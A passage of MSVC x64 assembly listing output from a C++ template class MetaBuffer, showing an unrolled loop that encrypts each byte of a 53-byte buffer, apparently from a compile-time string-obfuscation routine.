  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
